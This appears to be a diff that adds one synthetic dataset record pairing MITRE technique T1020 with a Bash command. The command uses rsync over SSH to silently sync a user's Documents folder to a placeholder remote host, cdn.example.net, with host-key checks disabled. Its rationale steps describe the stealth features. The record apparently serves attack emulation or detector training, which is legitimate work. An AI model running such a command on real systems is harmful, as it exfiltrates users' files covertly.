@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --update --bwlimit=2000 --exclude='*.tmp' --exclude='*.swp' -e 'ssh -i ~/.ssh/id_rsa -p 443 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null' $HOME/Documents/ backup@cdn.example.net:.cache/.rs/$HOSTNAME/Documents/",
+  "explanation": "Quietly and incrementally syncs user Documents to a remote SSH server on port 443 using rsync\u2019s native compression and update logic to minimize repeated transfers, aligning with T1020 automated exfiltration.",
+  "rationale_steps": [
+    "Select likely valuable files (Documents).",
+    "Throttle and compress transfer to reduce footprint.",
+    "Use rsync --update to avoid re-sending unchanged files.",
+    "Tunnel via SSH with non-interactive options to avoid prompts.",
+    "Quiet mode (-q) suppresses output to remain stealthy."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-17f8fb2a",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
